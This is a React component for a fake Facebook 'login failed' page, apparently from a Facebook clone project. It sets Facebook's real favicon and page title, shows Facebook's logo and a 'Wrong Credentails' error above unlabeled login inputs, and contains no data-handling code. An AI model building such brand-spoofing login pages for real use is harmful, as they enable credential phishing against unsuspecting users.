import React, { useEffect } from 'react'
import Footer from './Footer'
import './LoginFail.scss'

export default function LoginFail() {
  useEffect(() => {
    const favicon = document.getElementById('favicon')
    favicon.href = 'https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico'

    document.title = 'Log into Facebook | Facebook'

    document.body.style.overflowY = 'hidden'
    document.documentElement.scrollTop = 0
  }, [])

  return (
    <>
      <div className='loginFail'>
        <img
          src='https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg'
          alt='Facebook Logo'
          className='loginFail__logo'
        />

        <div className='loginFail__form__container'>
          <form className='loginFail__form'>
            <h4>Log Into Facebook</h4>

            <div className='loginFail__form__error'>
              <h6>Wrong Credentails</h6>
              <p>Invalid username or password</p>
            </div>

            <input type='text' />
            <input type='text' />
            <button type='submit'></button>
            <p>Forgot Password</p>
          </form>
        </div>
      </div>
      <Footer isLoginFooter />
    </>
  )
}
